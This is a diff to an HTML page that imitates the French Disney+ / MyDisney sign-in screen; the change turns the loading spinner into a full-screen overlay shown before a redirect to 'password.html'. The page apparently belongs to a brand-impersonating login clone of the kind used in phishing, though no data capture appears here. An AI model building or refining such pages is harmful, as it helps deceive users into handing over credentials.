@@ -79,32 +79,6 @@
       background-color: #333;
     }
 
-    #spinner {
-      display: none;
-      margin-top: 20px;
-    }
-
-    #spinner div {
-      border: 6px solid #ccc;
-      border-top: 6px solid #0063e5;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: auto;
-    }
-
-    #spinner p {
-      color: #333;
-      margin-top: 10px;
-    }
-
-    @keyframes spin {
-      to {
-        transform: rotate(360deg);
-      }
-    }
-
     .footer-note {
       font-size: 0.75rem;
       color: #444;
@@ -160,6 +134,31 @@
         height: 20px;
       }
     }
+
+    /* Spinner Overlay */
+    #spinnerOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.9);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      display: none;
+    }
+
+    .spinner {
+      width: 70px;
+      height: 70px;
+      border: 8px solid rgba(255, 255, 255, 0.1);
+      border-top: 8px solid #00bfff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body>
@@ -168,7 +167,7 @@
   <img src="Images/compose2.png" alt="Disney+" class="logo" />
 
   <main>
-    <!-- Logo MyDisney agrandi -->
+    <!-- Logo MyDisney -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="my-disney" />
 
     <h1>Entrez votre adresse e-mail pour continuer</h1>
@@ -180,12 +179,6 @@
       <input type="email" placeholder="Adresse e-mail" required />
       <button type="submit">Continuer</button>
     </form>
-
-    <!-- Spinner caché -->
-    <div id="spinner">
-      <div></div>
-      <p>Chargement...</p>
-    </div>
 
     <div class="footer-note">
       <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
@@ -203,15 +196,22 @@
     </div>
   </main>
 
+  <!-- Spinner Overlay -->
+  <div id="spinnerOverlay">
+    <div class="spinner"></div>
+  </div>
+
   <script>
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault(); // Empêche le rechargement
-    document.getElementById("spinner").style.display = "block"; // Affiche le spinner
-    setTimeout(() => {
-      window.location.href = "password.html"; // 👉 Redirection vers la page de mot de passe
-    }, 2500); // Délai en millisecondes
-  });
-</script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      document.getElementById("spinnerOverlay").style.display = "flex";
+
+      setTimeout(() => {
+        window.location.href = "password.html";
+      }, 2500);
+    });
+  </script>
 
 </body>
 </html>
